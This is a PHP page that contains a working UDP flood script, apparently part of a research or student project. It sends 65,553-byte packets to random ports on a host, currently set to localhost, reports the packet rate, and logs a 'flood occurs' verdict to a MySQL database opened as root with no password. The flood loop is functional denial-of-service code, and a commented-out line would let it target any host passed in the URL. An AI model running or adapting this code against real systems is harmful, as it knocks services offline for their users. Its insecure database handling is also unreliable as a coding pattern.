<html>
<head>
<link rel="stylesheet" href="nav.css" type="text/css">
</head>
<body>
<center>
<?php
//UDP
$out = 0;
$_GET['host']="localhost";
if(isset($_GET['host']))
{
	$packets = 0;
	ignore_user_abort(TRUE);
	set_time_limit(0);
 
//	$exec_time = $_GET['time'];
 	$exec_time = 1;
	$time = time();
	//print "Started: ".time('d-m-y h:i:s')."<br>";
	$max_time = $time+$exec_time;
 
	$host = $_GET['host'];
 
	for($i=0;$i<65553;$i++)
	{
			$out .= 'X';
	}
	while(1)
	{
		$packets++;
		if(time() > $max_time)
		{
			break;
		}
		$rand = rand(1,65553);
		$fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
		if($fp)
		{
			fwrite($fp, $out);
			fclose($fp);
		}
	}
 
 	echo "<br><b>UDP Flood</b><br>Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
	
	if ($packets>=100000)
	{echo "<br>UDP Flood is occures";
$ans="UDP Flood is occures";}
	else 
	{echo "<br>UDP Flood is not occures";
	$ans="UDP Flood is not occures";}
	
	
	echo '<br><br>
		<form action="" method=GET>
			<input type="hidden" name="xrt" value="php">
			<br>
It may be localhost or localhost:8081 or localhost:80<br>
			<input type=submit value=Go></form>';
}	
else
{ 
	echo '<br><b>UDP Flooding</b><br>
			<form action=? method=GET>
			<input type="hidden" name="xrt" value="php">
			Host: <br>
			<input type=submit value=Go></form>';
}
mysql_connect("localhost","root","");
mysql_select_db("phd");
$q1="update repudp set rdate=now(),msg='$ans'";
//$q1="insert into repudp (rdate,msg) values (now(),'$ans')";
	  mysql_query($q1);




?>
</center>
</body>
</html>
